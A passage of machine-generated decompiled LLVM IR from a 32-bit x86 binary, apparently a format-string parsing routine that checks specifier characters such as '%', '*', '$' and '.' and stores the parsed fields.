  %v4_804f054 = phi i32 [ %v4_804f05435, %dec_label_pc_804f04a ], [ %v6_804f054, %dec_label_pc_804f065 ]
  %v0_804f056 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80573ea.170 to i32), %dec_label_pc_804f04a ], [ %v1_804f056, %dec_label_pc_804f065 ]
  %v0_804f065 = phi i32 [ 1, %dec_label_pc_804f04a ], [ %v2_804f065, %dec_label_pc_804f065 ]
  store i32 %v0_804f065, i32* @ecx, align 4
  %v1_804f054 = inttoptr i32 %v0_804f056 to i8*
  %v2_804f054 = load i8, i8* %v1_804f054, align 1
  %v3_804f054 = zext i8 %v2_804f054 to i32
  %v5_804f054 = and i32 %v4_804f054, -256
  %v6_804f054 = or i32 %v3_804f054, %v5_804f054
  store i32 %v6_804f054, i32* %eax.global-to-local, align 4
  %v1_804f056 = add i32 %v0_804f056, 1
  store i32 %v1_804f056, i32* @edx, align 4
  %v2_804f057 = load i8, i8* %v1_804f057, align 1
  %v15_804f057 = icmp eq i8 %v2_804f057, %v2_804f054
  %v1_804f059 = icmp eq i1 %v15_804f057, false
  br i1 %v1_804f059, label %dec_label_pc_804f060, label %dec_label_pc_804f05b

dec_label_pc_804f05b:                             ; preds = %dec_label_pc_804f054
  %v1_804f05b = add i32 %v0_804f076, 1
  store i32 %v1_804f05b, i32* @esi, align 4
  %v0_804f05c = load i32, i32* %edi.global-to-local, align 4
  %v2_804f05c = or i32 %v0_804f05c, %v0_804f065
  store i32 %v2_804f05c, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f04a

dec_label_pc_804f060:                             ; preds = %dec_label_pc_804f054
  %v1_804f060 = inttoptr i32 %v1_804f056 to i8*
  %v2_804f060 = load i8, i8* %v1_804f060, align 1
  %v3_804f060 = icmp eq i8 %v2_804f060, 0
  br i1 %v3_804f060, label %dec_label_pc_804f069, label %dec_label_pc_804f065

dec_label_pc_804f065:                             ; preds = %dec_label_pc_804f060
  %v2_804f065 = mul i32 %v0_804f065, 2
  br label %dec_label_pc_804f054

dec_label_pc_804f069:                             ; preds = %dec_label_pc_804f060
  %v0_804f069 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804f06d = udiv i32 %v0_804f069, 2
  %v1_804f06d.not = or i32 %v1_804f06d, -6
  %v1_804f072 = xor i32 %v1_804f06d.not, 5
  store i32 %v1_804f072, i32* %eax.global-to-local, align 4
  %v2_804f074 = and i32 %v1_804f072, %v0_804f069
  store i32 %v2_804f074, i32* %edi.global-to-local, align 4
  %v1_804f076 = add i32 %v0_804f076, -1
  %v2_804f076 = inttoptr i32 %v1_804f076 to i8*
  %v3_804f076 = load i8, i8* %v2_804f076, align 1
  %v12_804f076 = icmp eq i8 %v3_804f076, 37
  %v1_804f07a = icmp eq i1 %v12_804f076, false
  br i1 %v1_804f07a, label %dec_label_pc_804efac, label %dec_label_pc_804f080

dec_label_pc_804f080:                             ; preds = %dec_label_pc_804f03b, %dec_label_pc_804f069, %dec_label_pc_804efe9, %dec_label_pc_804f02e
  %v0_804f0a3 = phi i32 [ %v1_804efd5, %dec_label_pc_804f02e ], [ %v1_804efd5, %dec_label_pc_804f03b ], [ 0, %dec_label_pc_804f069 ], [ %v1_804efd5, %dec_label_pc_804efe9 ]
  %v1_804f0ac = phi i32 [ %v0_804efdc, %dec_label_pc_804f02e ], [ %v0_804efdc, %dec_label_pc_804f03b ], [ %v0_804f076, %dec_label_pc_804f069 ], [ %v0_804efdc, %dec_label_pc_804efe9 ]
  %v0_804f0a9 = phi i32 [ %v0_804efe9, %dec_label_pc_804f02e ], [ %v0_804efe9, %dec_label_pc_804f03b ], [ %v1_804f056, %dec_label_pc_804f069 ], [ %v0_804efe9, %dec_label_pc_804efe9 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804f02e ], [ %stack_var_-32.1, %dec_label_pc_804f03b ], [ %stack_var_-32.2, %dec_label_pc_804f069 ], [ %stack_var_-32.1, %dec_label_pc_804efe9 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804f02e ], [ 0, %dec_label_pc_804f03b ], [ %stack_var_-88.2, %dec_label_pc_804f069 ], [ %stack_var_-88.1, %dec_label_pc_804efe9 ]
  %v1_804f080 = inttoptr i32 %v0_804f0a9 to i8*
  %v2_804f080 = load i8, i8* %v1_804f080, align 1
  %v11_804f080 = icmp eq i8 %v2_804f080, 42
  %v1_804f083 = icmp eq i1 %v11_804f080, false
  br i1 %v1_804f083, label %dec_label_pc_804f0b9, label %dec_label_pc_804f085

dec_label_pc_804f085:                             ; preds = %dec_label_pc_804f080
  %v4_804f085 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804f085, label %dec_label_pc_804f0a9, label %dec_label_pc_804f08c

dec_label_pc_804f08c:                             ; preds = %dec_label_pc_804f085
  %v1_804f08c = inttoptr i32 %v1_804f0ac to i8*
  %v2_804f08c = load i8, i8* %v1_804f08c, align 1
  %v11_804f08c = icmp eq i8 %v2_804f08c, 36
  %v1_804f08f = icmp eq i1 %v11_804f08c, false
  br i1 %v1_804f08f, label %dec_label_pc_804f2d1, label %dec_label_pc_804f095

dec_label_pc_804f095:                             ; preds = %dec_label_pc_804f08c
  %tmp91 = icmp slt i32 %v0_804f0a3, 1
  br i1 %tmp91, label %dec_label_pc_804f2d1, label %dec_label_pc_804f09d

dec_label_pc_804f09d:                             ; preds = %dec_label_pc_804f095
  store i32 %v8_804efb3, i32* %eax.global-to-local, align 4
  %v1_804f0a2 = add i32 %v1_804f0ac, 1
  store i32 %v1_804f0a2, i32* @esi, align 4
  %v1_804f0a3 = load i32, i32* @esp, align 4
  %v3_804f0a3 = add i32 %v8_804efb3, 68
  %v4_804f0a3 = add i32 %v3_804f0a3, %v1_804f0a3
  %v5_804f0a3 = inttoptr i32 %v4_804f0a3 to i32*
  store i32 %v0_804f0a3, i32* %v5_804f0a3, align 4
  %v0_804f0e7.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f0b4

dec_label_pc_804f0a9:                             ; preds = %dec_label_pc_804f085
  %v1_804f0a9 = add i32 %v0_804f0a9, 1
  store i32 %v1_804f0a9, i32* %eax.global-to-local, align 4
  %v12_804f0ac = icmp eq i32 %v1_804f0a9, %v1_804f0ac
  %v1_804f0ae = icmp eq i1 %v12_804f0ac, false
  br i1 %v1_804f0ae, label %dec_label_pc_804f2d1, label %dec_label_pc_804f0b4

dec_label_pc_804f0b4:                             ; preds = %dec_label_pc_804f0a9, %dec_label_pc_804f09d
  %v0_804f0e7.pre.pre.pre = phi i32 [ %v1_804f0ac, %dec_label_pc_804f0a9 ], [ %v0_804f0e7.pre.pre.pre.pre, %dec_label_pc_804f09d ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f0b9

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f080, %dec_label_pc_804f0b4
  %v0_804f0e7.pre.pre = phi i32 [ %v1_804f0ac, %dec_label_pc_804f080 ], [ %v0_804f0e7.pre.pre.pre, %dec_label_pc_804f0b4 ]
  %v0_804ef52 = phi i32 [ %v0_804f0a3, %dec_label_pc_804f080 ], [ -2147483648, %dec_label_pc_804f0b4 ]
  %v4_804f0b9 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804f0b9 = icmp eq i32 %v4_804f0b9, 0
  %v1_804f0be = icmp eq i1 %v5_804f0b9, false
  %.pre = inttoptr i32 %v0_804f0e7.pre.pre to i8*
  br i1 %v1_804f0be, label %dec_label_pc_804f0e2, label %dec_label_pc_804f0c4

dec_label_pc_804f0c4:                             ; preds = %dec_label_pc_804f0b9
  %v2_804f0c4 = load i8, i8* %.pre, align 1
  %v11_804f0c4 = icmp eq i8 %v2_804f0c4, 46
  %v1_804f0c7 = icmp eq i1 %v11_804f0c4, false
  br i1 %v1_804f0c7, label %dec_label_pc_804f0db, label %dec_label_pc_804f0c9

dec_label_pc_804f0c9:                             ; preds = %dec_label_pc_804f0c4
  %v1_804f0c9 = add i32 %v0_804f0e7.pre.pre, 1
  store i32 %v1_804f0c9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804efac.outer

dec_label_pc_804f0db:                             ; preds = %dec_label_pc_804f0c4
  br label %dec_label_pc_804f0e2

dec_label_pc_804f0e2:                             ; preds = %dec_label_pc_804f0b9, %dec_label_pc_804f0db
  %stack_var_-96.2 = phi i32 [ %v0_804ef52, %dec_label_pc_804f0db ], [ %stack_var_-96.1.ph, %dec_label_pc_804f0b9 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804f0db ], [ %v0_804ef52, %dec_label_pc_804f0b9 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8057398.171 to i32), i32* @edx, align 4
  %v4_804f0e7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0e7

dec_label_pc_804f0e7:                             ; preds = %dec_label_pc_804f0f1, %dec_label_pc_804f0e2
  %v0_804f0f1 = phi i32 [ %v1_804f0f1, %dec_label_pc_804f0f1 ], [ ptrtoint ([9 x i8]* @global_var_8057398.171 to i32), %dec_label_pc_804f0e2 ]
  %v4_804f0e7 = phi i32 [ %v6_804f0e7, %dec_label_pc_804f0f1 ], [ %v4_804f0e7.pre, %dec_label_pc_804f0e2 ]
  %v2_804f0e7 = load i8, i8* %.pre, align 1
  %v3_804f0e7 = zext i8 %v2_804f0e7 to i32
  %v5_804f0e7 = and i32 %v4_804f0e7, -256
  %v6_804f0e7 = or i32 %v3_804f0e7, %v5_804f0e7
  store i32 %v6_804f0e7, i32* %eax.global-to-local, align 4
  %v3_804f0e9 = inttoptr i32 %v0_804f0f1 to i8*
  %v4_804f0e9 = load i8, i8* %v3_804f0e9, align 1
  %v15_804f0e9 = icmp eq i8 %v2_804f0e7, %v4_804f0e9
  br i1 %v15_804f0e9, label %dec_label_pc_804ef59, label %dec_label_pc_804f0f1

dec_label_pc_804f0f1:                             ; preds = %dec_label_pc_804f0e7
  %v1_804f0f1 = add i32 %v0_804f0f1, 1
  store i32 %v1_804f0f1, i32* @edx, align 4
  %v1_804f0f2 = inttoptr i32 %v1_804f0f1 to i8*
  %v2_804f0f2 = load i8, i8* %v1_804f0f2, align 1
  %v3_804f0f2 = icmp eq i8 %v2_804f0f2, 0
  %v1_804f0f5 = icmp eq i1 %v3_804f0f2, false
  br i1 %v1_804f0f5, label %dec_label_pc_804f0e7, label %dec_label_pc_804f0f7

dec_label_pc_804f0f7:                             ; preds = %dec_label_pc_804f0f1, %dec_label_pc_804ef59
  %v0_804f10a = phi i32 [ %v1_804ef59, %dec_label_pc_804ef59 ], [ %v0_804f0e7.pre.pre, %dec_label_pc_804f0f1 ]
  %v0_804f107 = phi i32 [ %v0_804f0f1, %dec_label_pc_804ef59 ], [ %v1_804f0f1, %dec_label_pc_804f0f1 ]
  %v1_804f0f9 = add i32 %v0_804f107, -134575000
  %v1_804f0fe = add i32 %v0_804f107, -134575001
  %v5_804f0fe = sub i32 134575000, %v0_804f107
  %v6_804f0fe = and i32 %v1_804f0f9, %v5_804f0fe
  %v7_804f0fe = icmp slt i32 %v6_804f0fe, 0
  %v8_804f0fe = icmp eq i32 %v1_804f0fe, 0
  %v9_804f0fe = icmp slt i32 %v1_804f0fe, 0
  store i32 %v1_804f0fe, i32* %eax.global-to-local, align 4
  %v3_804f0ff = icmp eq i1 %v9_804f0fe, %v7_804f0fe
  %v4_804f0ff = icmp eq i1 %v8_804f0fe, false
  %v5_804f0ff = and i1 %v4_804f0ff, %v3_804f0ff
  br i1 %v5_804f0ff, label %dec_label_pc_804f10b, label %dec_label_pc_804f101

dec_label_pc_804f101:                             ; preds = %dec_label_pc_804f0f7
  %v1_804f101 = inttoptr i32 %v0_804f10a to i8*
  %v2_804f101 = load i8, i8* %v1_804f101, align 1
  %v3_804f101 = zext i8 %v2_804f101 to i32
  %v5_804f101 = and i32 %v1_804f0fe, -256
  %v6_804f101 = or i32 %v3_804f101, %v5_804f101
  store i32 %v6_804f101, i32* %eax.global-to-local, align 4
  %v3_804f103 = inttoptr i32 %v0_804f107 to i8*
  %v4_804f103 = load i8, i8* %v3_804f103, align 1
  %v15_804f103 = icmp eq i8 %v2_804f101, %v4_804f103
  %v1_804f105 = icmp eq i1 %v15_804f103, false
  br i1 %v1_804f105, label %dec_label_pc_804f10b, label %dec_label_pc_804f107

dec_label_pc_804f107:                             ; preds = %dec_label_pc_804f101
  %v1_804f107 = add i32 %v0_804f107, 9
  store i32 %v1_804f107, i32* @edx, align 4
  %v1_804f10a = add i32 %v0_804f10a, 1
  store i32 %v1_804f10a, i32* @esi, align 4
  br label %dec_label_pc_804f10b

dec_label_pc_804f10b:                             ; preds = %dec_label_pc_804f101, %dec_label_pc_804f0f7, %dec_label_pc_804f107
  %v4_804f10f = phi i32 [ %v6_804f101, %dec_label_pc_804f101 ], [ %v1_804f0fe, %dec_label_pc_804f0f7 ], [ %v6_804f101, %dec_label_pc_804f107 ]
  %v0_804f10f = phi i32 [ %v0_804f10a, %dec_label_pc_804f101 ], [ %v0_804f10a, %dec_label_pc_804f0f7 ], [ %v1_804f10a, %dec_label_pc_804f107 ]
  %v0_804f10b = phi i32 [ %v0_804f107, %dec_label_pc_804f101 ], [ %v0_804f107, %dec_label_pc_804f0f7 ], [ %v1_804f107, %dec_label_pc_804f107 ]
  %v1_804f10b = add i32 %v0_804f10b, 9
  %v2_804f10b = inttoptr i32 %v1_804f10b to i8*
  %v3_804f10b = load i8, i8* %v2_804f10b, align 1
  %v4_804f10b = sext i8 %v3_804f10b to i32
  store i32 %v4_804f10b, i32* %ebx.global-to-local, align 4
  %v1_804f10f = inttoptr i32 %v0_804f10f to i8*
  %v2_804f10f = load i8, i8* %v1_804f10f, align 1
  %v3_804f10f = zext i8 %v2_804f10f to i32
  %v5_804f10f = and i32 %v4_804f10f, -256
  %v6_804f10f = or i32 %v3_804f10f, %v5_804f10f
  store i32 %v6_804f10f, i32* %eax.global-to-local, align 4
  %v2_804f111 = mul nsw i32 %v4_804f10b, 256
  store i32 %v2_804f111, i32* %ebx.global-to-local, align 4
  %v4_804f114 = icmp eq i8 %v2_804f10f, 0
  br i1 %v4_804f114, label %dec_label_pc_804f2d1, label %dec_label_pc_804f11c

dec_label_pc_804f11c:                             ; preds = %dec_label_pc_804f10b
  %v3_804f11c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f11c, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_80573d5.172 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f125

dec_label_pc_804f125:                             ; preds = %dec_label_pc_804f175, %dec_label_pc_804f11c
  %v0_804f175 = phi i32 [ %v1_804f175, %dec_label_pc_804f175 ], [ ptrtoint ([21 x i8]* @global_var_80573d5.172 to i32), %dec_label_pc_804f11c ]
  %v3_804f125 = inttoptr i32 %v0_804f175 to i8*
  %v4_804f125 = load i8, i8* %v3_804f125, align 1
  %v15_804f125 = icmp eq i8 %v2_804f10f, %v4_804f125
  %v1_804f127 = icmp eq i1 %v15_804f125, false
  br i1 %v1_804f127, label %dec_label_pc_804f175, label %dec_label_pc_804f129

dec_label_pc_804f129:                             ; preds = %dec_label_pc_804f125
  %v1_804f12b = add i32 %v0_804f175, -134575061
  store i32 %v1_804f12b, i32* %edx.global-to-local, align 4
  %v7_804f134 = icmp sgt i32 %v1_804f12b, 17
  br i1 %v7_804f134, label %dec_label_pc_804f136, label %dec_label_pc_804f13f

dec_label_pc_804f136:                             ; preds = %dec_label_pc_804f129
  %v1_804f136 = add i32 %v0_804f175, -134575063
  store i32 %v1_804f136, i32* %eax.global-to-local, align 4
  %v3_804f139 = and i32 %v2_804f111, 1024
  %v4_804f139 = icmp eq i32 %v3_804f139, 0
  %v1_804f13c = icmp eq i1 %v4_804f139, false
  %v4_804f13c = select i1 %v1_804f13c, i32 %v1_804f136, i32 %v1_804f12b
  store i32 %v4_804f13c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f13f

dec_label_pc_804f13f:                             ; preds = %dec_label_pc_804f129, %dec_label_pc_804f136
  %v0_804f148 = phi i32 [ %v1_804f12b, %dec_label_pc_804f129 ], [ %v4_804f13c, %dec_label_pc_804f136 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80573cb.173 to i32), i32* %ecx.global-to-local, align 4
  %v2_804f148 = add i32 %tmp76, 32
  %v3_804f148 = inttoptr i32 %v2_804f148 to i32*
  store i32 %v0_804f148, i32* %v3_804f148, align 4
  %v0_804f14b.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804f14f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f14b

dec_label_pc_804f14b:                             ; preds = %dec_label_pc_804f14b, %dec_label_pc_804f13f
  %v0_804f14b = phi i32 [ %v1_804f14b, %dec_label_pc_804f14b ], [ %v0_804f14b.pre, %dec_label_pc_804f13f ]
  %v1_804f14b = add i32 %v0_804f14b, 1
  store i32 %v1_804f14b, i32* %ecx.global-to-local, align 4
  %v1_804f14c = inttoptr i32 %v1_804f14b to i8*
  %v2_804f14c = load i8, i8* %v1_804f14c, align 1
  %v3_804f14c = sext i8 %v2_804f14c to i32
  store i32 %v3_804f14c, i32* %eax.global-to-local, align 4
  %v8_804f151 = icmp sgt i32 %v0_804f14f.pre, %v3_804f14c
  br i1 %v8_804f151, label %dec_label_pc_804f14b, label %dec_label_pc_804f153

dec_label_pc_804f153:                             ; preds = %dec_label_pc_804f14b
  store i32 ptrtoint ([21 x i8]* @global_var_80573d5.172 to i32), i32* @ecx, align 4
  %v1_804f15a = add i32 %v0_804f14b, -134575051
  store i32 %v1_804f15a, i32* %eax.global-to-local, align 4
  %v2_804f15f = add i32 %v0_804f14b, add (i32 ptrtoint (i32* @global_var_80573bc.174 to i32), i32 -134575051)
  %v3_804f15f = add i32 %v2_804f15f, %v1_804f15a
  %v4_804f15f = inttoptr i32 %v3_804f15f to i16*
  %v5_804f15f = load i16, i16* %v4_804f15f, align 2
  %v6_804f15f = sext i16 %v5_804f15f to i32
  store i32 %v6_804f15f, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804f15a, 2
  %v3_804f167 = add i32 %factor, 134575020
  %v4_804f167 = inttoptr i32 %v3_804f167 to i16*
  %v5_804f167 = load i16, i16* %v4_804f167, align 2
  %v6_804f167 = sext i16 %v5_804f167 to i32
  store i32 %v6_804f167, i32* %eax.global-to-local, align 4
  %v1_804f16f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f16f = or i32 %v1_804f16f, %v6_804f15f
  %v2_804f171 = and i32 %v2_804f16f, %v6_804f167
  store i32 %v2_804f171, i32* %edx.global-to-local, align 4
  %v0_804f183.pre = load i32, i32* @esi, align 4
  %v0_804f186.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f17b

dec_label_pc_804f175:                             ; preds = %dec_label_pc_804f125
  %v1_804f175 = add i32 %v0_804f175, 1
  store i32 %v1_804f175, i32* @ecx, align 4
  %v1_804f176 = inttoptr i32 %v1_804f175 to i8*
  %v2_804f176 = load i8, i8* %v1_804f176, align 1
  %v3_804f176 = icmp eq i8 %v2_804f176, 0
  %v1_804f179 = icmp eq i1 %v3_804f176, false
  br i1 %v1_804f179, label %dec_label_pc_804f125, label %dec_label_pc_804f17b

dec_label_pc_804f17b:                             ; preds = %dec_label_pc_804f175, %dec_label_pc_804f153
  %v0_804f186 = phi i32 [ %v0_804f186.pre, %dec_label_pc_804f153 ], [ %storemerge4, %dec_label_pc_804f175 ]
  %v0_804f183 = phi i32 [ %v0_804f183.pre, %dec_label_pc_804f153 ], [ %v0_804f10f, %dec_label_pc_804f175 ]
  %v0_804f17b = phi i32 [ %v2_804f171, %dec_label_pc_804f153 ], [ %v3_804f11c, %dec_label_pc_804f175 ]
  store i32 %v0_804f17b, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f183 = inttoptr i32 %v0_804f183 to i8*
  %v2_804f183 = load i8, i8* %v1_804f183, align 1
  %v3_804f183 = sext i8 %v2_804f183 to i32
  store i32 %v3_804f183, i32* %eax.global-to-local, align 4
  %v2_804f186 = add i32 %tmp76, 4
  %v3_804f186 = inttoptr i32 %v2_804f186 to i32*
  store i32 %v0_804f186, i32* %v3_804f186, align 4
  %v0_804f189 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f189 = load i32, i32* @edx, align 4
  %v2_804f189 = add i32 %v1_804f189, 12
  %v3_804f189 = inttoptr i32 %v2_804f189 to i32*
  store i32 %v0_804f189, i32* %v3_804f189, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804f190 = load i32, i32* @edx, align 4
  %v1_804f190 = add i32 %v0_804f190, 28
  %v2_804f190 = inttoptr i32 %v1_804f190 to i32*
  store i32 1, i32* %v2_804f190, align 4
  %v0_804f197 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f197 = load i32, i32* @edx, align 4
  %v2_804f197 = add i32 %v1_804f197, 8
  %v3_804f197 = inttoptr i32 %v2_804f197 to i32*
  store i32 %v0_804f197, i32* %v3_804f197, align 4
  %v0_804f19a = load i32, i32* %edi.global-to-local, align 4
  %v1_804f1a4 = and i32 %v0_804f19a, -5
  %v0_804f1aa = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f1aa = and i32 %v0_804f1aa, 3840
  store i32 %v1_804f1aa, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804f1b3 = or i32 %v1_804f1aa, %v1_804f1a4
  store i32 %v2_804f1b3, i32* @edi, align 4
  %v1_804f1b5 = load i32, i32* @edx, align 4
  %v2_804f1b5 = add i32 %v1_804f1b5, 20
  %v3_804f1b5 = inttoptr i32 %v2_804f1b5 to i32*
  store i32 48, i32* %v3_804f1b5, align 4
  %v0_804f1b8 = load i32, i32* @edi, align 4
  %v1_804f1b8 = load i32, i32* @edx, align 4
  %v2_804f1b8 = add i32 %v1_804f1b8, 16
  %v3_804f1b8 = inttoptr i32 %v2_804f1b8 to i32*
  store i32 %v0_804f1b8, i32* %v3_804f1b8, align 4
  %v0_804f1bb = load i32, i32* @ecx, align 4
  %v1_804f1bb = inttoptr i32 %v0_804f1bb to i8*
  %v2_804f1bb = load i8, i8* %v1_804f1bb, align 1
  %v3_804f1bb = icmp eq i8 %v2_804f1bb, 0
  %v1_804f1be = icmp eq i1 %v3_804f1bb, false
  br i1 %v1_804f1be, label %dec_label_pc_804f1d7, label %dec_label_pc_804f1c0

dec_label_pc_804f1c0:                             ; preds = %dec_label_pc_804f17b
  %v0_804f1c0 = load i32, i32* @esi, align 4
  %v1_804f1c0 = inttoptr i32 %v0_804f1c0 to i8*
  %v2_804f1c0 = load i8, i8* %v1_804f1c0, align 1
  %v11_804f1c0 = icmp eq i8 %v2_804f1c0, 109
  %v1_804f1c3 = icmp eq i1 %v11_804f1c0, false
  br i1 %v1_804f1c3, label %dec_label_pc_804f2d1, label %dec_label_pc_804f1c9

dec_label_pc_804f1c9:                             ; preds = %dec_label_pc_804f1c0
  %v0_804f1c9 = load i32, i32* @edx, align 4
  %v1_804f1c9 = add i32 %v0_804f1c9, 32
  %v2_804f1c9 = inttoptr i32 %v1_804f1c9 to i32*
  store i32 20, i32* %v2_804f1c9, align 4
  %v0_804f1d0 = load i32, i32* @edx, align 4
  %v1_804f1d0 = add i32 %v0_804f1d0, 28
  %v2_804f1d0 = inttoptr i32 %v1_804f1d0 to i32*
  store i32 0, i32* %v2_804f1d0, align 4
  br label %dec_label_pc_804f1d7

dec_label_pc_804f1d7:                             ; preds = %dec_label_pc_804f17b, %dec_label_pc_804f1c9
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804f273, label %dec_label_pc_804f1e2

dec_label_pc_804f1e2:                             ; preds = %dec_label_pc_804f1d7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804f25b = add i32 %tmp76, 40
  %v4_804f1f1 = add i32 %tmp76, 36
  %v1_804f264 = add i32 %tmp76, 28
  %v2_804f264 = inttoptr i32 %v1_804f264 to i32*
  br label %dec_label_pc_804f1e4

dec_label_pc_804f1e4:                             ; preds = %dec_label_pc_804f25f, %dec_label_pc_804f1e2
  %v0_804f1fa = phi i32 [ 0, %dec_label_pc_804f1e2 ], [ %v1_804f263, %dec_label_pc_804f25f ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f1e2 ], [ %stack_var_-88.5, %dec_label_pc_804f25f ]
  %v1_804f1e4 = add i32 %v0_804f1fa, -2
  %v6_804f1e4 = sub i32 1, %v0_804f1fa
  %v7_804f1e4 = and i32 %v6_804f1e4, %v0_804f1fa
  %v8_804f1e4 = icmp slt i32 %v7_804f1e4, 0
  %v9_804f1e4 = icmp eq i32 %v1_804f1e4, 0
  %v10_804f1e4 = icmp slt i32 %v1_804f1e4, 0
  %v3_804f1e7 = icmp eq i1 %v10_804f1e4, %v8_804f1e4
  %v4_804f1e7 = icmp eq i1 %v9_804f1e4, false
  %v5_804f1e7 = and i1 %v4_804f1e7, %v3_804f1e7
  br i1 %v5_804f1e7, label %dec_label_pc_804f1fa, label %dec_label_pc_804f1e9

dec_label_pc_804f1e9:                             ; preds = %dec_label_pc_804f1e4
  %v0_804f1e9 = load i32, i32* @esp, align 4
  %v2_804f1e9 = mul i32 %v0_804f1fa, 4
  %v3_804f1e9 = add i32 %v2_804f1e9, 68
  %v4_804f1e9 = add i32 %v3_804f1e9, %v0_804f1e9
  %v5_804f1e9 = inttoptr i32 %v4_804f1e9 to i32*
  %v6_804f1e9 = load i32, i32* %v5_804f1e9, align 4
  store i32 %v6_804f1e9, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f1f1 = trunc i32 %v6_804f1e9 to i8
  %v5_804f1f1 = add i32 %v4_804f1f1, %v0_804f1fa
  %v6_804f1f1 = inttoptr i32 %v5_804f1f1 to i8*
  store i8 %v1_804f1f1, i8* %v6_804f1f1, align 1
  %v0_804f1f5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1f5 = urem i32 %v0_804f1f5, 256
  br label %dec_label_pc_804f203

dec_label_pc_804f1fa:                             ; preds = %dec_label_pc_804f1e4
  %v5_804f1fc = add i32 %v0_804f1fa, %stack_var_-32.3
  store i32 %v5_804f1fc, i32* %eax.global-to-local, align 4
  %v1_804f200 = add i32 %v5_804f1fc, -2
  br label %dec_label_pc_804f203

dec_label_pc_804f203:                             ; preds = %dec_label_pc_804f1e9, %dec_label_pc_804f1fa
  %v0_804f216 = phi i32 [ %v1_804f1f5, %dec_label_pc_804f1e9 ], [ %v1_804f200, %dec_label_pc_804f1fa ]
  store i32 %v0_804f216, i32* %eax.global-to-local, align 4
  %v5_804f203 = sub i32 %v0_804f216, %stack_var_-88.4
  %v11_804f203 = xor i32 %v0_804f216, %stack_var_-88.4
  %v12_804f203 = xor i32 %v5_804f203, %v0_804f216
  %v13_804f203 = and i32 %v12_804f203, %v11_804f203
  %v14_804f203 = icmp slt i32 %v13_804f203, 0
  %v15_804f203 = icmp eq i32 %v5_804f203, 0
  %v16_804f203 = icmp slt i32 %v5_804f203, 0
  %v3_804f207 = icmp ne i1 %v16_804f203, %v14_804f203
  %v4_804f207 = or i1 %v15_804f203, %v3_804f207
  br i1 %v4_804f207, label %dec_label_pc_804f216, label %dec_label_pc_804f209

dec_label_pc_804f209:                             ; preds = %dec_label_pc_804f203
  %v1_804f209 = add i32 %v0_804f216, -9
  %v6_804f209 = sub i32 8, %v0_804f216
  %v7_804f209 = and i32 %v6_804f209, %v0_804f216
  %v8_804f209 = icmp slt i32 %v7_804f209, 0
  %v9_804f209 = icmp eq i32 %v1_804f209, 0
  %v10_804f209 = icmp slt i32 %v1_804f209, 0
  %v3_804f20c = icmp eq i1 %v10_804f209, %v8_804f209
  %v4_804f20c = icmp eq i1 %v9_804f209, false
  %v5_804f20c = and i1 %v4_804f20c, %v3_804f20c
  br i1 %v5_804f20c, label %dec_label_pc_804f2d1, label %dec_label_pc_804f216

dec_label_pc_804f216:                             ; preds = %dec_label_pc_804f209, %dec_label_pc_804f203
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804f203 ], [ %v0_804f216, %dec_label_pc_804f209 ]
  %v1_804f216 = add i32 %v0_804f216, -1
  store i32 %v1_804f216, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804f21f = load i32, i32* @esp, align 4
  %v1_804f21f = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f21f = mul i32 %v1_804f21f, 4
  %v3_804f21f = add i32 %v0_804f21f, 80
  %v4_804f21f = add i32 %v3_804f21f, %v2_804f21f
  %v5_804f21f = inttoptr i32 %v4_804f21f to i32*
  %v6_804f21f = load i32, i32* %v5_804f21f, align 4
  store i32 %v6_804f21f, i32* %edi.global-to-local, align 4
  %v2_804f223 = mul i32 %v1_804f216, 4
  %v4_804f223 = add i32 %v4_804f25b, %v2_804f223
  %v5_804f223 = inttoptr i32 %v4_804f223 to i32*
  %v6_804f223 = load i32, i32* %v5_804f223, align 4
  store i32 %v6_804f223, i32* @eax, align 4
  %v9_804f227 = icmp eq i32 %v6_804f21f, 8
  br i1 %v9_804f227, label %dec_label_pc_804f25f, label %dec_label_pc_804f22c

dec_label_pc_804f22c:                             ; preds = %dec_label_pc_804f216
  %v9_804f22c = icmp eq i32 %v6_804f223, 8
